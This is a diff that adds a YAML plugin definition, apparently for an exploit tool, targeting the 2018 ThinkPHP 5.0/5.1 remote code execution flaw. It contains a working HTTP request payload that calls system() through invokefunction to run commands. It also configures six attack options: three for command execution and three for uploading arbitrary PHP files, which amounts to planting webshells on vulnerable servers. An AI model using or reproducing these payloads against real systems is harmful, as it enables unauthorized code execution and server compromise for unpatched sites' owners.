@@ -1,0 +1,95 @@
+info:
+    app: ThinkPHP
+    name: ThinkPHP 5.x
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2018-12-09"
+    create_date: ""
+    update_date: ""
+    scope: "5.0.0-5.0.22, 5.1.x-5.1.31"
+    description: |
+        ThinkPHP 官方 2018 年 12 月 9 日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的 getshell 漏洞
+    detail: |
+        http://www.thinkphp.com/thinkphp/public/index.php
+        目前只支持RCE
+        payload(1):5.0.x  payload(2/3):5.1.x
+    payload: |
+        GET /tp5.0.22/public/?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami HTTP/1.1
+        Host: 192.168.111.111
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Connection: close
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+    reference: ""
+payloads:
+    - name: cmd1
+      alias: 5.0.x命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            tips: whoami
+            default_value: whoami
+            required: true
+    - name: upload1
+      alias: 5.0.x文件上传
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            tips:
+            default_value: test.php
+            required: true
+          - key: content
+            title: 文件内容
+            param_type: textarea
+            tips:
+            default_value:
+            required: true
+    - name: cmd2
+      alias: 5.1.x命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            tips: whoami
+            default_value: whoami
+            required: true
+    - name: upload2
+      alias: 5.1.x文件上传1
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            tips:
+            default_value: test.php
+            required: true
+          - key: content
+            title: 文件内容
+            param_type: textarea
+            tips:
+            default_value:
+            required: true
+    - name: cmd3
+      alias: 5.1.x命令执行2
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            tips: whoami
+            default_value: whoami
+            required: true
+    - name: upload3
+      alias: 5.1.x文件上传2
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            tips:
+            default_value: test.php
+            required: true
+          - key: content
+            title: 文件内容
+            param_type: textarea
+            tips:
+            default_value:
+            required: true
